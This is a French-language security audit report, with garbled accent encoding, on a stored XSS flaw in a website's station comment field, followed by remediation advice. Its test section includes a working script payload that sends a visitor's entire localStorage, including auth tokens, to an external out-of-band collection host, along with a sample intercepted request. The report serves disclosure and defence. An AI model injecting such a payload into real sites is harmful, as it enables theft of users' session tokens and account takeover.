# ğŸ”’ Rapport dâ€™Audit CybersÃ©curitÃ© â€” VulnÃ©rabilitÃ© XSS

### ğŸ¯ Cible :
Site web â€” http://10.33.70.223:8000/

### ğŸ“… Date de lâ€™audit :
06/12/2025

### ğŸ‘¨â€ğŸ’» Auditeur :
LaDÃ©bauche

## 1. ğŸ“‹ Contexte
Dans le cadre dâ€™un audit de sÃ©curitÃ©, nous avons testÃ© toutes les zones de saisie utilisateur du site, notamment le champ commentaire sur les stations. Lâ€™objectif Ã©tait de dÃ©tecter la prÃ©sence de vulnÃ©rabilitÃ©s de type Cross-Site Scripting (XSS).

## 2. âš ï¸ Description de la vulnÃ©rabilitÃ©
### Type :
Cross-Site Scripting (XSS) stockÃ©

###Â Localisation :
Champ commentaire sur les stations

###Â DÃ©tails :
Le champ commentaire nâ€™Ã©chappe pas ni ne filtre correctement les entrÃ©es. Il est possible dâ€™injecter du code JavaScript qui sera exÃ©cutÃ© sur les navigateurs des visiteurs, ce qui constitue un risque majeur.

##Â 3. ğŸ§ª Tests rÃ©alisÃ©s
### Test 1 : injection simple
Payload injectÃ© :
```
<script>alert(1)</script>
```
RÃ©sultat :
Une alerte sâ€™affiche immÃ©diatement dans le navigateur â†’ preuve que le XSS est exploitable.

### Test 2 : vol de donnÃ©es via XSS
Payload injectÃ© :
```
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```
RÃ©sultat :
Le script vole le contenu complet du localStorage, incluant notamment des tokens dâ€™authentification, et lâ€™envoie vers un serveur externe contrÃ´lÃ© par lâ€™attaquant.

Exemple de requÃªte interceptÃ©e :
```bash
GET /capture?ls={"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","auth_user":"{\"id\":\"683d6f786e7170f60e39139e\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"}
Host: d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro

```

## 4. ğŸ’¥ Impact

ğŸš¨ Vol des donnÃ©es sensibles (tokens, identifiantsâ€¦)

ğŸ”“ Prise de contrÃ´le possible des comptes utilisateurs

ğŸ¦  Propagation de scripts malveillants (keylogger, redirection, etc.)

ğŸ“‰ Perte de confiance des utilisateurs, risques lÃ©gaux


## 5. ğŸ› ï¸ Recommandations & RÃ©mÃ©diations

### 5.1 Validation stricte via regex pour le champ commentaire
EmpÃªcher lâ€™injection de caractÃ¨res spÃ©ciaux utilisÃ©s dans XSS :
```
[<>{}()"'/;]
```
Ce filtre bloque les caractÃ¨res < > { } ( ) " ' / ; qui servent Ã  construire des balises ou scripts malveillants.

### 5.2 Assainissement cÃ´tÃ© serveur
Nettoyer et encoder les entrÃ©es avant affichage.

Utiliser des fonctions dâ€™Ã©chappement HTML standards.

### 5.3 Mise en place dâ€™une Content Security Policy (CSP)
Limiter les sources de scripts autorisÃ©es pour empÃªcher lâ€™exÃ©cution de scripts externes ou injectÃ©s.

### 5.4 Validation cÃ´tÃ© client (optionnelle mais recommandÃ©e)
AmÃ©liorer lâ€™expÃ©rience utilisateur en dÃ©tectant les erreurs avant lâ€™envoi.

##Â 6. âœ… Conclusion
La faille XSS dÃ©tectÃ©e est critique et doit Ãªtre corrigÃ©e rapidement pour protÃ©ger les utilisateurs et prÃ©server lâ€™intÃ©gritÃ© du site. Lâ€™implÃ©mentation dâ€™un filtrage rigoureux, couplÃ©e Ã  une politique CSP, est indispensable.

